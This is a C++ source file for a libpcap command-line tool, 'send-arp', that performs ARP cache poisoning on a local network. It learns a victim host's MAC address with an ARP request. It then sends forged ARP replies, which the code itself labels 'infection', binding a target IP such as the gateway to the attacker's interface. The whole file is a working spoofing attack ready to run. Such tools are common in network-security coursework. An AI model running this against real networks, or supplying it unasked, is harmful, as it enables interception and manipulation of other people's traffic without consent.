#include <sys/ioctl.h>
#include <net/if.h>
#include <pcap.h>
#include <unistd.h>
#include <cstdio>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// Get Interface Mac Address
bool get_mac_addr(const std::string& interface_name, Mac& interface_mac_addr) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0); // socket file descriptor
    if (sockfd == -1) {
        printf("failed create socket for MAC address\n");
        return false;
    }

    struct ifreq ifr;
    std::memset(&ifr, 0, sizeof(ifr));
    std::strncpy(ifr.ifr_name, interface_name.c_str(), IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
        printf("failed ioctl for MAC address\n");
        close(sockfd);
        return false;
    }

    close(sockfd);
    interface_mac_addr = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
    return true;
}

// Get Interface Ip Address
bool get_ip_addr(const std::string& interface_name, Ip& interface_ip_addr) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0); // socket file descriptor
    if (sockfd == -1) {
        printf("failed create socket for IP address\n");
        return false;
    }

    struct ifreq ifr;
    std::memset(&ifr, 0, sizeof(ifr));
    std::strncpy(ifr.ifr_name, interface_name.c_str(), IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
        printf("failed ioctl for IP address\n");
        close(sockfd);
        return false;
    }

    close(sockfd);
    interface_ip_addr = Ip(ntohl(reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr)->sin_addr.s_addr));
    return true;
}

// Send ARP Request
bool send_arp_request(pcap_t* pcap, const Mac& interfaceMac, const Ip& interfaceIp, const Ip& senderIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); // broadcast
    packet.eth_.smac_ = interfaceMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = interfaceMac;
    packet.arp_.sip_ = htonl(interfaceIp);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // allnow
    packet.arp_.tip_ = htonl(senderIp);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    return (res == 0);
}

// Send ARP Reply (Infection)
bool send_arp_reply(pcap_t* pcap, const Mac& interfaceMac, const Mac& senderMac, const Ip& senderIp, const Ip& targetIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = senderMac;
    packet.eth_.smac_ = interfaceMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = interfaceMac;
    packet.arp_.sip_ = htonl(targetIp);
    packet.arp_.tmac_ = senderMac;
    packet.arp_.tip_ = htonl(senderIp);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    return (res == 0);
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
        printf("couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

    Mac interfaceMac;
    if (!get_mac_addr(dev, interfaceMac)) {
        printf("failed to get MAC address of %s\n", dev);
        pcap_close(pcap);
        return -1;
    }

    Ip interfaceIp;
    if (!get_ip_addr(dev, interfaceIp)) {
        printf("failed to get IP address of %s\n", dev);
        pcap_close(pcap);
        return -1;
    }

    printf("Interface MAC Address: %s\n", std::string(interfaceMac).c_str());
    printf("Interface IP Address: %s\n", std::string(interfaceIp).c_str());

    // separate <interface> <sender ip> <target ip>
    for (int i = 2; i < argc; i += 2) {
        Ip senderIp = Ip(argv[i]);
        Ip targetIp = Ip(argv[i + 1]);

        if (!send_arp_request(pcap, interfaceMac, interfaceIp, senderIp)) {
            printf("failed to send ARP request to %s\n", std::string(senderIp).c_str());
            continue;
        }

        Mac senderMac;
        while (true) {
            struct pcap_pkthdr* header;
            const u_char* packet;

            int res = pcap_next_ex(pcap, &header, &packet);
            if (res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("failed to capture packet %s\n", pcap_geterr(pcap));
                break;
            }

            EthHdr* eth_hdr = (EthHdr*)packet;
            if (eth_hdr->type() != EthHdr::Arp) continue;

            ArpHdr* arp_hdr = (ArpHdr*)(packet + sizeof(EthHdr));
            if (arp_hdr->op() != ArpHdr::Reply) continue;

            if (arp_hdr->tmac() == interfaceMac &&
                arp_hdr->tip() == interfaceIp &&
                arp_hdr->sip() == senderIp) {
                senderMac = arp_hdr->smac();
                break;
            }
        }

        printf("Sender MAC: %s\n", std::string(senderMac).c_str());

        if (!send_arp_reply(pcap, interfaceMac, senderMac, senderIp, targetIp)) {
            printf("failed to send ARP reply (infection) to %s\n", std::string(senderIp).c_str());
        } else {
            printf("ARP reply (infection) sent to %s\n", std::string(senderIp).c_str());
        }
    }
	pcap_close(pcap);
}
